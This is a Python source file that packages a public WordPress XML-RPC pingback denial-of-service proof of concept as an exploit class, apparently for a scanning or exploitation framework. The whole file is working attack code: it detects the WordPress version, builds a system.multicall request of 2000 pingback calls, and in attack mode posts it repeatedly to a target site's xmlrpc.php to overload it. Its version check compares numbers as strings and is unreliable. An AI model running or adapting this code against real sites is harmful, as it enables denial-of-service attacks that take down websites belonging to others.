# Nethanel Gelernter (c)
from urllib.parse import urlparse
import sys
import urllib3
import requests

from wpdetector import WPDetector

urllib3.disable_warnings()

DEBUG = True
REQUESTS_TO_SEND = 300


def dprint(X):
    if DEBUG: print(X)


COUNT = 0


def build_entry(pingback, target):
    """
    This function builds the request that triggers the pingback feature
    :param pingback: String. the link from the malicious site to the victims site
    :param target: String. the victims site
    :return: String
    """
    global COUNT
    COUNT += 1
    entry = "<value><struct><member><name>methodName</name><value>pingback.ping</value></member><member>"
    entry += f"<name>params</name><value><array><data><value>{pingback}/{COUNT}</value>"
    # entry += f"<name>params</name><value><array><data><value>{pingback}/{uuid.uuid4()}</value>"
    entry += f"<value>{target}/?p=1</value></data></array></value></member></struct></value>"
    # entry += f"<value>{target}/#e</value></data></array></value></member></struct></value>" # taxes DB more
    return entry


def build_request(pingback, target, entries):
    """
    This function buildes the http request that we well send
    :param pingback:String. the link from the malicious site to the victims site
    :param target: String. the victims site
    :param entries: int. how many requests to make
    :return: String
    """
    prefix = "<methodCall><methodName>system.multicall</methodName><params><param><array>"
    suffix = "</array></param></params></methodCall>"
    request = prefix
    for _ in range(0, entries): request += build_entry(pingback, target)
    request += suffix
    return request


def usage_die():
    print(f"[!] Usage: {sys.argv[0]} <check/attack> <pingback url> <target url>")
    exit(1)


class DenialOfServicePoCExploit(object):

    def __init__(self, domain, additional_data=None, proxies=None):
        """
        Keep state of data that is collected and tries that were performed for efficieny
        :param domain: String. The domain the we are working on
        :param additional_data: data that might be useful for performing the bruteforce (e.g., login page URL)
        :param proxies: working via HTTP proxies
        """
        try:
            try:
                target = 'http://www.' + domain
                res = urlparse(target)
                if not all((res.scheme, res.netloc)):
                    raise Exception
            except:
                print('error in target domain')
            self._target = 'http://' + domain
            if additional_data is None:
                self._action = "attack"
                self._pingback = 'http://aviad.com/exploit/'
            else:
                self._action = additional_data[1]
                self._pingback = additional_data[2]
            try:
                res = urlparse(self._pingback)
                if not all((res.scheme, res.netloc)):
                    raise Exception
            except:
                print('error in pingback')
            detector = WPDetector(domain)
            self._version = detector.get_version()[1]
            self._vulnerable = self.is_vulnerable_version(self._version)
            self._proxies = proxies
        except Exception as e:
            print(e)

    def plugin_name(self):
        """
        :return: the vulnerable plugin's name
        """
        return 'Plugin not relevant for this exploit'

    def vulnerable_versions(self):
        """
        :return: string the describes the ranges of vulnerable methods
        """
        return 'WordPress <= 5.3.?'

    def is_vulnerable_version(self, version_str):
        """
        :param version_str: X.Y.Z....
        :return: Boolean. Whether the version is vulnerable or not
        """
        try:
            version = version_str.split('.')
            if version[0] < '5':
                return True
            elif version[0] == '5':
                if version[1] <= '3':
                    return True
            return False
        except Exception as e:
            print(e)

    def get_references(self):
        """
        :return: list of URLs for data about the exploit & vulnerability (where did you find the data?)
        """
        return ['https://www.exploit-db.com/exploits/47800']

    def is_vulnerable(self, data=None, proxies=None):
        """
        Test whether vulnerable or not. If many requests or suspicious requests might be sent, consider adding
        aggresive parameter
        :param data: dictionary with data that can be used for the method
        :param proxies: working via HTTP proxies. If None, the constructor's proxies are used (if any)
        :return: Boolean - whether domain is vulnerable or not
        """
        try:
            if self.is_vulnerable_version(self._version):
                return True
            return False
        except Exception as e:
            print(e)

    def exploit(self, action=None, pingback=None, target=None):
        """
        If possible to exploit (E.g., in server-side vulns) - exploit
        In client-side, return the exploit code to use
        :param target: String. the victims site
         :param pingback: String. the link from the malicious site to the victims site
        :param action: String. if we want to check if possible or to attack
        :return: Boolean. If the exploit succeeded or not
        """
        try:
            if action is None:
                action = self._action
            if pingback is None:
                pingback = self._pingback
            if target is None:
                target = self._target
            print("[>] WordPress <= 5.3.? Denial-of-Service PoC")
            print("[>] @roddux 2019 | Arcturus Security | labs.arcturus.net")
            entries = 0
            if action == "check":
                entries = 2
            elif action == "attack":
                entries = 2000
            print(f"[+] Running in {action} mode")
            print(f"[+] Got pingback URL \"{pingback}\"")
            print(f"[+] Got target URL \"{target}\"")
            print(f"[+] Building {entries} pingback calls")
            # entries = 1000 # TESTING
            xmldata = build_request(pingback, target, entries)
            dprint("[+] Request:\n")
            dprint(xmldata + "\n")
            print(f"[+] Request size: {len(xmldata)} bytes")
            if action == "attack":
                print("[+] Starting attack loop, CTRL+C to stop...")
                rcount = 0
                try:
                    while rcount < REQUESTS_TO_SEND:
                        try:
                            resp = requests.post(f"{target}/xmlrpc.php", xmldata, verify=False, allow_redirects=False,
                                                 timeout=.2)
                            if resp.status_code != 200:
                                print(f"[!] Received odd status ({resp.status_code}) -- DoS successful?")
                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                            pass
                        rcount += 1
                        print(f"\r[+] Requests sent: {rcount}", end="")
                    return True
                except KeyboardInterrupt:
                    print("\n[>] Attack finished", end="\n\n")
                    return True
                    exit(0)
            elif action == "check":
                print("[+] Sending check request")
                try:
                    resp = requests.post(f"{target}/xmlrpc.php", xmldata, verify=False, allow_redirects=False, timeout=10)
                    if resp.status_code != 200:
                        print(f"[!] Received odd status ({resp.status_code}) -- check target url")
                    print("[+] Request sent")
                    print("[+] Response headers:\n")
                    print(resp.headers)
                    print("[+] Response dump:")
                    print(resp.content.decode("UTF-8"))
                    print("[+] Here's the part where you figure out if it's vulnerable, because I CBA to code it")
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                    print("[!] Connection error")
                    return False
                    exit(1)
                print("[>] Check finished")
                return True
        except Exception as e:
            print(e)
            return False

    # Feel free to add public method that you consider to be relevant for the users
    # user _ and __ for private and protected methods that should not be used outside the class
